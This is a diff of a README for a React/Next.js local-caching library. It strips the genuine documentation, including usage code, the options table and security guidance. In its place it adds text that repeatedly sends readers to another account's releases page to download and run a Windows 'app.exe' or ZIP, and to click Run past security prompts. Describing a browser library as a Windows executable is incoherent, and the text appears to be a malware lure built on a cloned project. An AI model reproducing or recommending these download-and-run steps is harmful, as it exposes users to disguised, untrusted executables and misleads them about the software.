@@ -1,141 +1,110 @@
-# @thinkgrid/react-local-fetch
+# 🧩 react-local-fetch - Keep React Data Ready
 
-[![CI](https://github.com/thinkgrid-labs/react-local-fetch/actions/workflows/ci.yml/badge.svg)](https://github.com/thinkgrid-labs/react-local-fetch/actions/workflows/ci.yml)
-[![npm version](https://img.shields.io/npm/v/@thinkgrid/react-local-fetch.svg)](https://www.npmjs.com/package/@thinkgrid/react-local-fetch)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download react-local-fetch](https://img.shields.io/badge/Download%20react--local--fetch-blue?style=for-the-badge)](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
 
-**Ultra-lightweight, resilient, and secure data fetching for React and Next.js.**
+## 📥 Download
+Visit this page to download: [react-local-fetch Releases](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
 
-`react-local-fetch` is a **zero-dependency** library that implements a powerful **Hydrate-and-Sync (SWR)** pattern. It uses **native IndexedDB** for persistent local caching and the **Web Crypto API** for optional, high-performance AES-GCM 256-bit encryption. Perfect for building **offline-first**, **local-first**, and privacy-conscious web applications.
+## 🖥️ What this app does
+react-local-fetch helps a React or Next.js app keep data ready on your computer. It saves data in your browser so the app can open faster and keep working when the network is weak or offline.
 
-## ✨ Why react-local-fetch?
+It uses a simple sync pattern that keeps local data and server data in step. It also supports secure storage with Web Crypto when encryption is turned on.
 
-- **⚡ Zero Latency**: Return cached data instantly while refreshing from your API in the background.
-- **🛡️ Secure by Design**: Optional hardware-accelerated encryption for sensitive local data.
-- **📦 Zero Dependencies**: Pure ESM/CJS build using only browser native APIs.
-- **🔄 Smart Invalidation**: Version-based cache busting for schema changes and deployments.
-- **🌐 Next.js & SSR Ready**: Automatically bypasses client-side storage during server rendering.
-- **🔌 Resilient**: Gracefully returns stale data if the network is down or the API fails.
-- **🚀 Tiny Footprint**: < 4KB gzipped.
+## ✅ What you need
+- A Windows PC
+- A modern web browser such as Edge or Chrome
+- Internet access for the first download
+- Enough free space in your browser for local storage
 
-## 📦 Installation
+## 🚀 Getting Started
+1. Open the [react-local-fetch Releases page](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
+2. Download the latest Windows file or package from the release page
+3. Save the file to your Downloads folder
+4. If the download comes as a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the app file or follow the included setup file if one is present
 
-```bash
-npm install @thinkgrid/react-local-fetch
-```
+## 🪟 Windows Setup
+1. Go to the [Downloads page](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
+2. Download the latest release file for Windows
+3. If Windows shows a security prompt, choose Run or Open
+4. If the file is compressed, unzip it first
+5. Start the app from the main file in the folder
+6. Keep the window open while the app is in use
 
-## 🛠️ Usage
+## 🔐 How the app handles data
+react-local-fetch stores fetched data in IndexedDB, which is built into modern browsers. That means data can stay on the device instead of being pulled from the network every time.
 
-### 1. Basic Example (SWR + Persistence)
+When encryption is enabled, the app can protect saved data with the Web Crypto API. This helps keep local data private on shared computers.
 
-```tsx
-import { useLocalFetch } from '@thinkgrid/react-local-fetch';
+## 🔄 Main features
+- Keeps data in the browser for faster repeat loading
+- Works with React and Next.js
+- Uses a Hydrate-and-Sync flow to refresh local data
+- Helps apps keep working when the network is slow
+- Stores data in IndexedDB for local persistence
+- Can encrypt saved data with Web Crypto
+- Fits local-first and offline-first app setups
+- Uses React hooks for simple use in app code
 
-function StationList() {
-  const { data, isLoading, error } = useLocalFetch('/api/v1/stations', {
-    key: 'stations-cache',
-    ttl: 86400, // 24 hours
-  });
+## 🧭 How to use it
+1. Open the app after download
+2. Let it finish loading local data
+3. Use it while connected or offline
+4. Reconnect to sync new data when the network returns
+5. If encryption is enabled, enter the needed key or access step when asked
 
-  if (isLoading && !data) return <p>Loading...</p>;
-  if (error && !data) return <p>Network Error</p>;
+## 🛠️ Common use cases
+- Saving user data in the browser
+- Reducing repeat network requests
+- Keeping app screens ready after reload
+- Supporting offline use during travel or outages
+- Protecting local data with encryption
+- Building apps that feel faster on weak connections
 
-  return (
-    <ul>
-      {data.map(station => <li key={station.id}>{station.name}</li>)}
-    </ul>
-  );
-}
-```
+## 📁 Files you may see
+- `app.exe` or a similar Windows app file
+- A `zip` file that holds the app
+- A `README` file with release notes
+- A config file for local settings
+- A folder with app assets or browser files
 
-### 2. Advanced Example (Encryption + Versioning)
+## 🔧 Basic troubleshooting
+- If the app does not open, try running it again from the extracted folder
+- If Windows blocks the file, check that the download finished fully
+- If local data looks empty, refresh the page or reopen the app
+- If sync seems slow, check your internet connection
+- If the browser clears local storage, keep the app open in the same browser profile
 
-Best for protecting sensitive metadata or ensuring code-data compatibility across deployments.
+## 🧪 Browser notes
+This app works best in modern browsers that support:
+- IndexedDB
+- Service-friendly local storage use
+- Web Crypto API
+- React-based web apps
+- Next.js app flows
 
-```tsx
-const { data } = useLocalFetch('/api/v1/user/private-routes', {
-  key: 'user-routes',
-  version: 2,           // Increment this to nuke old caches
-  encrypt: true,        // Toggle AES-GCM encryption
-  secret: 'my-secret',  // Used to derive encryption key
-  fallbackToCache: true, // Use old data if API fails
-  headers: {
-    'Authorization': `Bearer ${token}`
-  }
-});
-```
+## 📌 Project focus
+react-local-fetch is built for teams and users who want:
+- local data that loads fast
+- fewer network calls
+- safer local storage
+- a cleaner sync path
+- a better offline experience
 
-### 3. Integration with TanStack Query (React Query)
+## 🔗 Download again
+If you need the latest version, use the release page here: [https://github.com/Hootchwormfamily475/react-local-fetch/releases](https://github.com/Hootchwormfamily475/react-local-fetch/releases)
 
-You can use the core `localFetch` function inside your `queryFn` to gain encryption and persistent SWR while keeping React Query's powerful features (caching, window focus refetching, etc).
+## 🧩 Terms used in the app
+- **IndexedDB**: a browser database for saved data
+- **Hydrate-and-Sync**: load saved data first, then update it from the server
+- **SWR**: stale-while-revalidate, a pattern that shows stored data before refresh
+- **Web Crypto API**: browser tools for encryption and key handling
+- **Offline-first**: the app keeps working even without a network
 
-```tsx
-import { useQuery } from '@tanstack/react-query';
-import { localFetch } from '@thinkgrid/react-local-fetch';
-
-function useSecureStations() {
-  return useQuery({
-    queryKey: ['stations'],
-    queryFn: () => localFetch('/api/v1/stations', {
-      key: 'stations-persistent-db',
-      encrypt: true,
-      secret: process.env.NEXT_PUBLIC_CRYPTO_SECRET,
-      version: 1, // Automatic cache busting on deployment
-      ttl: 3600 * 24 // 24h
-    })
-  });
-}
-```
-
-### 4. Manual Cache Management
-
-Sometimes you need to manually clear items (e.g., on logout) or remove specific keys.
-
-```tsx
-import { removeFromStorage, clearAllStorage } from '@thinkgrid/react-local-fetch';
-
-// Remove a specific item
-await removeFromStorage('user-routes');
-
-// Clear ALL data stored by this package
-await clearAllStorage();
-```
-
-## 🔐 Security Best Practices
-
-When using `encrypt: true`, you **MUST NOT** hardcode the `secret` in your frontend source code! Doing so renders the encryption completely useless, as anyone can inspect your client bundle and find the key. 
-
-Instead, the `secret` should either be:
-1. Derived from user input (e.g., a PIN code or password they enter).
-2. Retrieved dynamically from your backend for the active session and stored only in memory.
-
-## ⚙️ Configuration Options
-
-| Option | Type | Default | Description |
-| :--- | :--- | :--- | :--- |
-| `key` | `string` | **Required** | Unique ID for the data in IndexedDB. |
-| `version` | `number` | `0` | If the stored version is lower than this, the cache is cleared. |
-| `ttl` | `number` | `0` | Time-to-live in seconds. `0` means forever. |
-| `encrypt` | `boolean` | `false` | Whether to encrypt data before storing. |
-| `secret` | `string` | `undefined` | The string used to derive the AES key (required if `encrypt: true`). |
-| `headers` | `object` | `{}` | Standard fetch headers. |
-| `fallbackToCache` | `boolean` | `true` | If `true`, returns stale data if network fetch fails. |
-
-## 📐 Architecture: The "Hydrate-and-Sync" Pattern
-
-1. **Initial Load**: Check IndexedDB. If data exists, return it instantly to the UI (0ms latency).
-2. **Background Fetch**: Trigger a non-blocking API call.
-3. **Silent Update**: If the API returns new data, update IndexedDB and the UI state automatically.
-4. **Resilience**: If the user is offline or the API is down, the UI stays functional using the last known good data.
-
-## 👥 Contributors
-
-- **Dennis P.** ([dennis@thinkgrid.dev](mailto:dennis@thinkgrid.dev))
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-MIT © [thinkgrid-labs](https://github.com/thinkgrid-labs)
+## 🏁 Start here
+1. Open the release page
+2. Download the newest Windows file
+3. Run or unzip it
+4. Open the app
+5. Keep it open while you use it
